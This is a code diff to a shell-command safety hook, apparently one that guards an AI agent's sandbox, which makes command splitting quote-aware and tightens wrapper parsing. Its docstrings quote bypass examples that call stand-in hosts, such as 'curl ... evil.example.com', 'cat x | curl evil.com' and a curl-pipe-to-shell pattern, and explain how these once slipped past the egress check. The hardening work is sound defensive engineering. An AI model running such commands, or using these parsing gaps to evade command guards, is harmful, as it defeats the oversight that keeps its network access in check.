@@ -166,7 +166,9 @@ _FORCE_PUSH_FLAGS = {"-f", "--force", "--force-with-lease"}
 # `sudo rm -rf` matches the same rules as `rm -rf`. timeout's duration and
 # leading VAR=val assignments after env are skipped too. Anything fancier
 # (nested `sh -c`, eval, command substitution) is out of scope for this
-# hook — network-layer controls remain the enforcement backstop.
+# hook. Do not read that as "something else catches it": what the network
+# layer actually enforces for the chat sandbox is documented in
+# docs/cloud-chat.md, and it has not always been a backstop.
 #
 # This is an allowlist, so it is inherently incomplete: a privilege/exec
 # wrapper that is not listed hides the command behind it from every token
@@ -175,8 +177,8 @@ _FORCE_PUSH_FLAGS = {"-f", "--force", "--force-with-lease"}
 # Only wrappers with the simple `WRAPPER [flags] [positionals] CMD ARGS...`
 # shape belong here. `su`/`runuser`/`sh -c` take a shell STRING, not a
 # command vector, and re-parsing that is out of scope for this hook (same
-# bucket as eval / command substitution) — network-layer controls remain the
-# enforcement backstop.
+# bucket as eval / command substitution). See docs/cloud-chat.md for what the
+# network layer actually enforces.
 #
 # This is an allowlist, so it is inherently incomplete: an unlisted
 # privilege/exec wrapper hides the command behind it from every token check.
@@ -220,19 +222,47 @@ _WRAPPER_VALUE_FLAGS = {
 _WRAPPER_POSITIONALS = {"chroot": 1, "flock": 1, "taskset": 1, "chrt": 1}
 
 
+_SHELL_OPERATORS = {";", "&", "&&", "|", "||", "\n", "(", ")"}
+
+
 def _split_segments(cmd: str) -> list[str]:
     """Split a command line into independently-scanned shell segments.
 
+    Quote-AWARE: a plain ``re.split`` on ``[;&|\n]`` tears a quoted argument
+    apart, and for the egress check that fails OPEN rather than safe —
+    ``curl -H "Accept: text/html; q=0.9" evil.example.com`` would put the
+    host in a segment whose first token is no longer ``curl``, so the
+    bare-host allowlist never inspected it (security review on #1141).
+
     A single ``|`` splits too: the downstream side of a pipe is its own
-    command, and the bare-host egress check only inspects a segment's
-    first token, so ``cat x | curl evil.com`` would otherwise never
-    host-check the ``curl`` (its first token is ``cat``). Splitting on a
-    single ``|`` also covers ``||`` and ``&&`` (the empty middle piece is
-    dropped), so the whole ``[;&|\\n]`` class is one character set. The
-    pipe-to-shell rule runs over the WHOLE command before this split, so
-    it still sees ``curl … | sh`` intact."""
-    parts = re.split(r"[;&|\n]", cmd)
-    return [p.strip() for p in parts if p.strip()]
+    command, and the bare-host egress check only inspects a segment's first
+    token, so ``cat x | curl evil.com`` would otherwise never host-check the
+    ``curl``. The pipe-to-shell rule runs over the WHOLE command before this
+    split, so it still sees ``curl … | sh`` intact.
+
+    Falls back to the naive split when the line does not lex (unbalanced
+    quotes) — an over-eager split can only over-ask, and refusing to scan at
+    all would be the one genuinely unsafe option.
+    """
+    try:
+        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
+        lex.whitespace_split = True
+        tokens = list(lex)
+    except ValueError:
+        return [p.strip() for p in re.split(r"[;&|\n]", cmd) if p.strip()]
+
+    segments: list[str] = []
+    current: list[str] = []
+    for tok in tokens:
+        if tok in _SHELL_OPERATORS:
+            if current:
+                segments.append(shlex.join(current))
+                current = []
+            continue
+        current.append(tok)
+    if current:
+        segments.append(shlex.join(current))
+    return segments
 
 
 def _tokens(seg: str) -> list[str]:
@@ -278,7 +308,7 @@ def _unwrap(toks: list[str]) -> list[str]:
         if t in _WRAPPERS:
             current = t
             i += 1
-            if t == "timeout" and i < len(toks) and re.fullmatch(r"\d+[smhd]?", toks[i]):
+            if t == "timeout" and i < len(toks) and re.fullmatch(r"\d+(?:\.\d+)?[smhd]?", toks[i]):
                 i += 1
             for _ in range(_WRAPPER_POSITIONALS.get(t, 0)):
                 if i < len(toks) and not toks[i].startswith("-"):
@@ -311,18 +341,23 @@ def _is_env_dump(seg: str) -> bool:
     ``sudo env`` (security review on #1141)."""
     toks = _tokens(seg)
     i = 0
+    current: str | None = None
     while i < len(toks):
         t = _basename(toks[i])
         if t in _WRAPPERS and t != "env":
+            current = t
             i += 1
-            if t == "timeout" and i < len(toks) and re.fullmatch(r"\d+[smhd]?", toks[i]):
+            if t == "timeout" and i < len(toks) and re.fullmatch(r"\d+(?:\.\d+)?[smhd]?", toks[i]):
                 i += 1
             for _ in range(_WRAPPER_POSITIONALS.get(t, 0)):
                 if i < len(toks) and not toks[i].startswith("-"):
                     i += 1
             continue
         if toks[i].startswith("-"):
+            flag = toks[i]
             i += 1
+            if "=" not in flag and flag in _WRAPPER_VALUE_FLAGS.get(current or "", set()) and i < len(toks):
+                i += 1
             continue
         break
     rest = toks[i:]
